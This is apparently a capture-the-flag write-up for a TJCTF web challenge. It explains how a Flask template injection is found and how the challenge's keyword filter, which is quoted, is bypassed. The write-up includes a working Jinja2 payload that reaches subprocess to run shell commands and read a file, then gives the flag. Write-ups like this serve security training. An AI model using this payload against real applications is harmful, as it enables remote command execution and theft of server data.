# Congenial Octo Couscous

Try filling out the form once -- it returns some of our own input. Sign of XSS or SSTI.  
`<b>1</b>` doesn't do anything, but `{{config}}` does.

```text
SERVER_FILEPATH&#39;: &#39;/secretserverfile.py&#39;}&gt;.
```

This line ^^^ in particular looks interesting. Visiting the link `/secretserverfile.py` reveals the source code for the challenge, which includes some code about filtration.

```javascript
if '{' in text or '}' in text:
        text2=re.sub(r'\s','',text).lower()
        illegal = ['"', 'class', '[', ']', 'dict', 'sys', 'os', 'eval', 'exec', 'config.']
```

So it seems like the challenge is to bypass the filter to read the strategy guide. Given flask is written in python, it would make sense to import a module that can execute commands; althought os is filtered, subprocess is not, and now the only challenge is figuring out how to import. After a fair bit of googling, it turns out

```text
request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')
```

Can be used to import a module. Combining this with subprocess we get a final payload of:

```javascript
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('subprocess')|attr('getoutput')('cat strategyguide.txt')}}
```

and reading the file gives us: Best formation that wins every time:  
`DDDDD DLLLD DLHLD DLLLD DDDDD Key: D=Drone L=Landscaper H=HQ Beginning of game strategy`:

## tjctf{c0ng3n1al\_500iq\_str4ts\_ez\_dub}

